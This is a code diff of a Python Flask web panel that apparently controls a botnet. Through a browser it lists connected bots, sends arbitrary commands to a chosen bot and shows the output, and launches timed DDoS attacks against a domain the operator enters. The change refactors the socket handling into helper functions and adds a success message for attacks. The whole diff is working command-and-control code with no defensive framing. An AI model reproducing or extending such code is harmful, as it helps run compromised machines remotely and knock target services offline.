@@ -3,13 +3,15 @@
 from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
 from socket import error
 from connection import getSock, recvTimeout
+from actions import getIpList, getCmdResponse, sendDdos
 import socket
 import os
 import sys
 
 app = Flask(__name__)
 app.config['TESTING'] = True
-errors = {'conn_err': 'Failed to connect to the server', 'ins_err': 'Check if ip and port are correct'}
+login_msg = {'conn_err': 'Failed to connect to the server', 'ins_error': 'Check if ip and port are correct'}
+ddos_msg = {'ins_error': 'Url cannot be empty', 'ddos_success': 'Attack successfully sended'}
 
 @app.route('/')
 def home():
@@ -26,7 +28,7 @@ def login():
         session['ip'] = server_ip
         session['port'] = int(server_port)
         if not server_ip or int(server_port) not in range(1,65535):
-            return render_template('login.html', error = errors['ins_err'])
+            return render_template('login.html', error = login_msg['ins_error'])
         try:
             sock = getSock(session)
             session['logged_in'] = True
@@ -34,9 +36,9 @@ def login():
             return redirect(url_for('main_activity'))
         except socket.timeout as err:
             print('[DEBUG] Timeout error | reason: %s' %(err))
-            return render_template('login.html', error = errors['conn_err'])
+            return render_template('login.html', error = login_msg['conn_err'])
         except error as serr:
-            return render_template('login.html', error = errors['conn_err'])
+            return render_template('login.html', error = login_msg['conn_err'])
 
     if request.method == 'GET':
         return render_template('login.html')
@@ -57,12 +59,8 @@ def main_activity():
             return redirect(url_for('login'))
         else:
             try:
-                sock = getSock(session) 
-                sock.send("*".encode('utf-8'))
-                ip_data = recvTimeout(sock, 0.5).split('*')
-                session['cnt_peers'] = len(ip_data)
+                ip_data = getIpList(session)
                 print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
-                sock.close()
                 return render_template('main_activity.html', ip_list = ip_data)
             except socket.timeout as err:
                 sock.close()
@@ -75,18 +73,14 @@ def peer_activity(ip):
         if request.form['submit'] == 'Send':
             cmd = request.form.get('cmd_text')
             host = request.form.get("host")
-            if cmd == '':
+            res = getCmdResponse(session, host, cmd)
+            
+            if res == '':
                 return render_template('peer_activity.html', ip = ip)
-            sock = getSock(session)
-            srv_msg = "*".join(['CMD', host, cmd])
-            sock.send(srv_msg.encode('utf-8'))
-            print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
-            resp = recvTimeout(sock)
-            sock.close()
-            #TODO Check  resp format
-            if resp:
-                print("[DEBUG] Response from Server: %s" %resp)
-                return render_template('peer_activity.html', ip = ip, cmd_response = resp)
+            
+            elif res:
+                print("[DEBUG] Response from Server: %s" %res)
+                return render_template('peer_activity.html', ip = ip, cmd_response = res)
             else:
                 return render_template('peer_activity.html', ip = ip)
 
@@ -107,19 +101,19 @@ def ddos_setup():
             n_peers = request.form.get('range')
             time = request.form.get('time')
             host = request.form.get('domain')
-            if ('http' or 'https') in host:
-                host = host.split('/')[2]
-            msg = '*'.join(['DDOS', n_peers, time, host])
-            sock = connect(session.get('ip'), session.get('port'))
-            sock.send(msg.encode('utf-8'))
-            sock.close()
-            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
+            res = sendDdos(session, host, n_peers, time)
+            
+            if res:
+                return render_template('ddos_setup.html', n_peers = len(getIpList(session)), msg = ddos_msg['ddos_success'])
+            else:
+                return render_template('ddos_setup.html', n_peers = len(getIpList(session)), error = ddos_msg['ins_error'])
+
         elif request.form['submit'] == 'Back':
             return redirect(url_for('main_activity'))
 
     elif request.method == 'GET':
         if session.get('logged_in') == True:
-            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
+            return render_template('ddos_setup.html', n_peers = len(getIpList(session)))
         else: 
             return redirect(url_for('login'))
 
